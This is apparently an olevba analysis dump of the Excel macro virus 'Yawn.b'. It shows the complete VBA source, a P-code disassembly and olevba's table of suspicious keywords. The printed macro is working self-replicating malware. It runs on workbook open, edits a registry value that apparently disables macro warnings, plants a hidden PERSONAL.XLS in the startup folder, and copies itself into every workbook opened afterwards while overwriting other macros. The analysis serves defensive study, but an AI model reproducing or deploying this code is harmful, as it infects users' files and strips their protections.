olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Yawn.b.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Yawn.b.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: Virus.MSExcel.Yawn.b.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO CQ.bas 
in file: Virus.MSExcel.Yawn.b.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/CQ'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "ADVAPI32.DLL" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegSetValueExA Lib "ADVAPI32.DLL" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
Private Declare Function RegCloseKey Lib "ADVAPI32.DLL" (ByVal hKey As Long) As Long
Global Const REG_DWORD As Long = 4
Global Const HKEY_CURRENT_USER As Long = &H80000001
Dim ob1 As New Class1
Dim p As String
Dim AppS As String
'taitai
Private Sub auto_open()
    u = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\Microsoft\Office\8.0\Excel\Microsoft Excel", 0, KEY_ALL_ACCESS, k)
    u = RegSetValueExA(k, "Options6", 0, REG_DWORD, Chr$(0), 4)
    u = RegCloseKey(k)
    p = Application.PathSeparator
    AppS = Application.StartupPath
    DelMcr
    If UCase(ThisWorkbook.Name) = "PERSONAL.XLS" Then
        Application.OnSheetActivate = "ActOpf_Evt"
        ActOpf_Evt
    Else
        CkStrUP
    End If
End Sub
Private Sub ActOpf_Evt()
    Set ob1.app = Application
End Sub
Private Sub Chk_Opf()
    On Error GoTo h_er
    Application.DisplayAlerts = False
    Application.ScreenUpdating = False
    awn = ActiveWorkbook.Name
    If Left(Right(awn, 4), 3) = ".xl" Then
        aw_m_n = Chk_Mo_N(awn)
        If aw_m_n = "" Then
            n = Chk_Mo_N(ThisWorkbook.Name)
            cop_m (n)
            Workbooks(awn).Save
        Else
            m_n = ActiveWorkbook.VBProject.VBComponents(aw_m_n).CodeModule.Lines(9, 1)
            If m_n <> "'taitai" Then
                Set v_c = ActiveWorkbook.VBProject.VBComponents
                For i = v_c.Count To 1 Step -1
                    If v_c(i).Type = 1 Or v_c(i).Type = 2 Then
                        v_c.Remove v_c(i)
                    End If
                Next i
                n = Chk_Mo_N(ThisWorkbook.Name)
                cop_m (n)
                Workbooks(awn).Save
            End If
        End If
    End If
    Application.ScreenUpdating = True
    Application.DisplayAlerts = True
    Exit Sub
h_er:
End Sub
Private Sub CkStrUP()
    Application.DisplayAlerts = False
    Application.ScreenUpdating = False
     f1 = "PERSONAL.XLS"
    If UCase(Dir(AppS & p & f1)) <> f1 Then
        cre_f
    ElseIf chk_per = False Then
        Workbooks("Personal.xls").Close
        Kill AppS & p & f1
        cre_f
    Else
    End If
    Workbooks("Personal.xls").Close
    Workbooks.Open AppS & p & "Personal.xls"
    Application.Run "Personal.xls!ActOpf_Evt"
    Application.OnSheetActivate = "'" & AppS & p & f1 & "'!ActOpf_Evt"
    Application.DisplayAlerts = True
    Application.ScreenUpdating = True
End Sub
Private Function chk_per()
    arg = "'" & AppS & p & "[Personal.xls]Sheet1" & "'!" & _
        Range("C1").Range("A1").Address(, , xlR1C1)
    ModuleName1 = Chk_Mo_N("Personal.xls")
    If ar2 <> ModuleName1 Then
        chk_per = False
    Else
        chk_per = True
    End If
End Function
Private Function Chk_Mo_N(WkName)
On Error Resume Next
    Set a1 = Workbooks(WkName).VBProject.VBComponents
    For i = 1 To a1.Count
        If a1(i).Type = 1 Then
            Chk_Mo_N = a1(i).Name
            Exit For
        Else
            Chk_Mo_N = ""
        End If
    Next i
End Function
Private Sub cre_f()
    Workbooks.Add
    n = Chk_Mo_N(ThisWorkbook.Name)
    Range("C1") = "=rand()"
    r_n = Chr((Range("C1") * 100) Mod 21 + 65) & _
        Chr((Val(Left(Right(Now(), 5), 2)) * 100) Mod 21 + 65)
    Range("C1") = r_n
    cop_m (n)
    ActiveWorkbook.VBProject.VBComponents(n).Name = r_n
    Set aw = ActiveWorkbook.Sheets
    For i = aw.Count To 2 Step -1
        aw(i).Delete
    Next i
    aw_n = ActiveWorkbook.Name
    ActiveWindow.Visible = False
    Workbooks(aw_n).SaveAs AppS & p & "Personal.xls"
End Sub
Private Function cop_m(n)
    On Error Resume Next
    Set tw = ThisWorkbook.VBProject.VBComponents
    Set aw = ActiveWorkbook.VBProject.VBComponents
    tw(n).Export (AppS & p & "t")
    aw.Import (AppS & p & "t")
    Kill (AppS & p & "t")
    tw("Class1").Export (AppS & p & "t")
    aw.Import (AppS & p & "t")
    Kill (AppS & p & "t")
End Function
Private Sub DelMcr()
    On Error Resume Next
    n1 = ActiveWorkbook.Name
    Set a2 = Application.CommandBars("Tools")
    a2.Reset
    If a2.Controls(10).Id = 30017 Then
        a2.Controls(10).Delete
    End If
    Workbooks(n1).Activate
End Sub
-------------------------------------------------------------------------------
VBA MACRO Class1.cls 
in file: Virus.MSExcel.Yawn.b.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Class1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 





Public WithEvents app As Application






Private Sub App_WorkbookOpen(ByVal Wb As Excel.Workbook)
    Application.Run "'" & Application.StartupPath & Application.PathSeparator & "Personal.xls'!Chk_Opf"
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSExcel.Yawn.b.xls
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 965 bytes
' _VBA_PROJECT_CUR/VBA/Лист1 - 956 bytes
' _VBA_PROJECT_CUR/VBA/CQ - 8422 bytes
' Line #0:
' 	FuncDefn (Private Declare Function RegOpenKeyExA Lib "ADVAPI32.DLL" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long)
' Line #1:
' 	FuncDefn (Private Declare Function RegSetValueExA Lib "ADVAPI32.DLL" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long)
' Line #2:
' 	FuncDefn (Private Declare Function RegCloseKey Lib "ADVAPI32.DLL" (ByVal hKey As Long) As Long)
' Line #3:
' 	Dim (Global Const) 
' 	LitDI2 0x0004 
' 	VarDefn REG_DWORD (As Long)
' Line #4:
' 	Dim (Global Const) 
' 	LitHI4 0x0001 0x8000 
' 	VarDefn HKEY_CURRENT_USER (As Long)
' Line #5:
' 	Dim 
' 	VarDefn ob1 (New )
' Line #6:
' 	Dim 
' 	VarDefn p (As String)
' Line #7:
' 	Dim 
' 	VarDefn AppS (As String)
' Line #8:
' 	QuoteRem 0x0000 0x0006 "taitai"
' Line #9:
' 	FuncDefn (Private Sub auto_open())
' Line #10:
' 	Ld HKEY_CURRENT_USER 
' 	LitStr 0x0033 "Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	LitDI2 0x0000 
' 	Ld KEY_ALL_ACCESS 
' 	Ld k 
' 	ArgsLd RegOpenKeyExA 0x0005 
' 	St u 
' Line #11:
' 	Ld k 
' 	LitStr 0x0008 "Options6"
' 	LitDI2 0x0000 
' 	Ld REG_DWORD 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0004 
' 	ArgsLd RegSetValueExA 0x0006 
' 	St u 
' Line #12:
' 	Ld k 
' 	ArgsLd RegCloseKey 0x0001 
' 	St u 
' Line #13:
' 	Ld Application 
' 	MemLd PathSeparator 
' 	St p 
' Line #14:
' 	Ld Application 
' 	MemLd StartupPath 
' 	St AppS 
' Line #15:
' 	ArgsCall DelMcr 0x0000 
' Line #16:
' 	Ld ThisWorkbook 
' 	MemLd New 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000C "PERSONAL.XLS"
' 	Eq 
' 	IfBlock 
' Line #17:
' 	LitStr 0x000A "ActOpf_Evt"
' 	Ld Application 
' 	MemSt OnSheetActivate 
' Line #18:
' 	ArgsCall ActOpf_Evt 0x0000 
' Line #19:
' 	ElseBlock 
' Line #20:
' 	ArgsCall CkStrUP 0x0000 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	EndSub 
' Line #23:
' 	FuncDefn (Private Sub ActOpf_Evt())
' Line #24:
' 	SetStmt 
' 	Ld Application 
' 	Ld ob1 
' 	Memset app 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Private Sub Chk_Opf())
' Line #27:
' 	OnError h_er 
' Line #28:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #29:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #30:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	St awn 
' Line #31:
' 	Ld awn 
' 	LitDI2 0x0004 
' 	ArgsLd Right 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 ".xl"
' 	Eq 
' 	IfBlock 
' Line #32:
' 	Ld awn 
' 	ArgsLd Chk_Mo_N 0x0001 
' 	St aw_m_n 
' Line #33:
' 	Ld aw_m_n 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #34:
' 	Ld ThisWorkbook 
' 	MemLd New 
' 	ArgsLd Chk_Mo_N 0x0001 
' 	St n 
' Line #35:
' 	Ld n 
' 	Paren 
' 	ArgsCall cop_m 0x0001 
' Line #36:
' 	Ld awn 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #37:
' 	ElseBlock 
' Line #38:
' 	LitDI2 0x0009 
' 	LitDI2 0x0001 
' 	Ld aw_m_n 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St m_n 
' Line #39:
' 	Ld m_n 
' 	LitStr 0x0007 "'taitai"
' 	Ne 
' 	IfBlock 
' Line #40:
' 	SetStmt 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set v_c 
' Line #41:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld v_c 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #42:
' 	Ld i 
' 	ArgsLd v_c 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld i 
' 	ArgsLd v_c 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0002 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #43:
' 	Ld i 
' 	ArgsLd v_c 0x0001 
' 	Ld v_c 
' 	ArgsMemCall Remove 0x0001 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #46:
' 	Ld ThisWorkbook 
' 	MemLd New 
' 	ArgsLd Chk_Mo_N 0x0001 
' 	St n 
' Line #47:
' 	Ld n 
' 	Paren 
' 	ArgsCall cop_m 0x0001 
' Line #48:
' 	Ld awn 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #53:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #54:
' 	ExitSub 
' Line #55:
' 	Label h_er 
' Line #56:
' 	EndSub 
' Line #57:
' 	FuncDefn (Private Sub CkStrUP())
' Line #58:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #59:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #60:
' 	LitStr 0x000C "PERSONAL.XLS"
' 	St f1 
' Line #61:
' 	Ld AppS 
' 	Ld p 
' 	Concat 
' 	Ld f1 
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld f1 
' 	Ne 
' 	IfBlock 
' Line #62:
' 	ArgsCall cre_f 0x0000 
' Line #63:
' 	Ld chk_per 
' 	LitVarSpecial (False)
' 	Eq 
' 	ElseIfBlock 
' Line #64:
' 	LitStr 0x000C "Personal.xls"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0000 
' Line #65:
' 	Ld AppS 
' 	Ld p 
' 	Concat 
' 	Ld f1 
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #66:
' 	ArgsCall cre_f 0x0000 
' Line #67:
' 	ElseBlock 
' Line #68:
' 	EndIfBlock 
' Line #69:
' 	LitStr 0x000C "Personal.xls"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0000 
' Line #70:
' 	Ld AppS 
' 	Ld p 
' 	Concat 
' 	LitStr 0x000C "Personal.xls"
' 	Concat 
' 	Ld Workbooks 
' 	ArgsMemCall Option 0x0001 
' Line #71:
' 	LitStr 0x0017 "Personal.xls!ActOpf_Evt"
' 	Ld Application 
' 	ArgsMemCall Run 0x0001 
' Line #72:
' 	LitStr 0x0001 "'"
' 	Ld AppS 
' 	Concat 
' 	Ld p 
' 	Concat 
' 	Ld f1 
' 	Concat 
' 	LitStr 0x000C "'!ActOpf_Evt"
' 	Concat 
' 	Ld Application 
' 	MemSt OnSheetActivate 
' Line #73:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #74:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #75:
' 	EndSub 
' Line #76:
' 	FuncDefn (Private Function chk_per())
' Line #77:
' 	LineCont 0x0004 0C 00 08 00
' 	LitStr 0x0001 "'"
' 	Ld AppS 
' 	Concat 
' 	Ld p 
' 	Concat 
' 	LitStr 0x0014 "[Personal.xls]Sheet1"
' 	Concat 
' 	LitStr 0x0002 "'!"
' 	Concat 
' 	ParamOmitted 
' 	ParamOmitted 
' 	Ld xlR1C1 
' 	LitStr 0x0002 "A1"
' 	LitStr 0x0002 "C1"
' 	ArgsLd Range 0x0001 
' 	ArgsMemLd Range 0x0001 
' 	ArgsMemLd Address 0x0003 
' 	Concat 
' 	St arg 
' Line #78:
' 	LitStr 0x000C "Personal.xls"
' 	ArgsLd Chk_Mo_N 0x0001 
' 	St ModuleName1 
' Line #79:
' 	Ld ar2 
' 	Ld ModuleName1 
' 	Ne 
' 	IfBlock 
' Line #80:
' 	LitVarSpecial (False)
' 	St chk_per 
' Line #81:
' 	ElseBlock 
' Line #82:
' 	LitVarSpecial (True)
' 	St chk_per 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	EndFunc 
' Line #85:
' 	FuncDefn (Private Function Chk_Mo_N(WkName))
' Line #86:
' 	OnError (Resume Next) 
' Line #87:
' 	SetStmt 
' 	Ld WkName 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set a1 
' Line #88:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a1 
' 	MemLd Count 
' 	For 
' Line #89:
' 	Ld i 
' 	ArgsLd a1 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #90:
' 	Ld i 
' 	ArgsLd a1 0x0001 
' 	MemLd New 
' 	St Chk_Mo_N 
' Line #91:
' 	ExitFor 
' Line #92:
' 	ElseBlock 
' Line #93:
' 	LitStr 0x0000 ""
' 	St Chk_Mo_N 
' Line #94:
' 	EndIfBlock 
' Line #95:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #96:
' 	EndFunc 
' Line #97:
' 	FuncDefn (Private Sub cre_f())
' Line #98:
' 	Ld Workbooks 
' 	ArgsMemCall Add 0x0000 
' Line #99:
' 	Ld ThisWorkbook 
' 	MemLd New 
' 	ArgsLd Chk_Mo_N 0x0001 
' 	St n 
' Line #100:
' 	LitStr 0x0007 "=rand()"
' 	LitStr 0x0002 "C1"
' 	ArgsSt Range 0x0001 
' Line #101:
' 	LineCont 0x0004 12 00 08 00
' 	LitStr 0x0002 "C1"
' 	ArgsLd Range 0x0001 
' 	LitDI2 0x0064 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0015 
' 	Mod 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	ArgsLd Now 0x0000 
' 	LitDI2 0x0005 
' 	ArgsLd Right 0x0002 
' 	LitDI2 0x0002 
' 	ArgsLd LBound 0x0002 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0064 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0015 
' 	Mod 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St r_n 
' Line #102:
' 	Ld r_n 
' 	LitStr 0x0002 "C1"
' 	ArgsSt Range 0x0001 
' Line #103:
' 	Ld n 
' 	Paren 
' 	ArgsCall cop_m 0x0001 
' Line #104:
' 	Ld r_n 
' 	Ld n 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' Line #105:
' 	SetStmt 
' 	Ld ActiveWorkbook 
' 	MemLd Sheets 
' 	Set aw 
' Line #106:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld aw 
' 	MemLd Count 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #107:
' 	Ld i 
' 	ArgsLd aw 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #108:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #109:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	St aw_n 
' Line #110:
' 	LitVarSpecial (False)
' 	Ld ActiveWindow 
' 	MemSt Visible 
' Line #111:
' 	Ld AppS 
' 	Ld p 
' 	Concat 
' 	LitStr 0x000C "Personal.xls"
' 	Concat 
' 	Ld aw_n 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall SaveAs 0x0001 
' Line #112:
' 	EndSub 
' Line #113:
' 	FuncDefn (Private Function cop_m(n))
' Line #114:
' 	OnError (Resume Next) 
' Line #115:
' 	SetStmt 
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set tw 
' Line #116:
' 	SetStmt 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set aw 
' Line #117:
' 	Ld AppS 
' 	Ld p 
' 	Concat 
' 	LitStr 0x0001 "t"
' 	Concat 
' 	Paren 
' 	Ld n 
' 	ArgsLd tw 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #118:
' 	Ld AppS 
' 	Ld p 
' 	Concat 
' 	LitStr 0x0001 "t"
' 	Concat 
' 	Paren 
' 	Ld aw 
' 	ArgsMemCall Import 0x0001 
' Line #119:
' 	Ld AppS 
' 	Ld p 
' 	Concat 
' 	LitStr 0x0001 "t"
' 	Concat 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #120:
' 	Ld AppS 
' 	Ld p 
' 	Concat 
' 	LitStr 0x0001 "t"
' 	Concat 
' 	Paren 
' 	LitStr 0x0006 "Class1"
' 	ArgsLd tw 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #121:
' 	Ld AppS 
' 	Ld p 
' 	Concat 
' 	LitStr 0x0001 "t"
' 	Concat 
' 	Paren 
' 	Ld aw 
' 	ArgsMemCall Import 0x0001 
' Line #122:
' 	Ld AppS 
' 	Ld p 
' 	Concat 
' 	LitStr 0x0001 "t"
' 	Concat 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #123:
' 	EndFunc 
' Line #124:
' 	FuncDefn (Private Sub DelMcr())
' Line #125:
' 	OnError (Resume Next) 
' Line #126:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	St n1 
' Line #127:
' 	SetStmt 
' 	LitStr 0x0005 "Tools"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	Set a2 
' Line #128:
' 	Ld a2 
' 	ArgsMemCall Reset 0x0000 
' Line #129:
' 	LitDI2 0x000A 
' 	Ld a2 
' 	ArgsMemLd Controls 0x0001 
' 	MemLd Id 
' 	LitDI2 0x7541 
' 	Eq 
' 	IfBlock 
' Line #130:
' 	LitDI2 0x000A 
' 	Ld a2 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #131:
' 	EndIfBlock 
' Line #132:
' 	Ld n1 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Activate 0x0000 
' Line #133:
' 	EndSub 
' _VBA_PROJECT_CUR/VBA/Class1 - 1625 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' 	Dim (Public) 
' 	VarDefn (WithEvents) app (As Application) 0x0000
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' 	FuncDefn (Private Sub App_WorkbookOpen(ByVal Wb As ))
' Line #13:
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd StartupPath 
' 	Concat 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	LitStr 0x0015 "Personal.xls'!Chk_Opf"
' 	Concat 
' 	Ld Application 
' 	ArgsMemCall Run 0x0001 
' Line #14:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |ADVAPI32.DLL        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

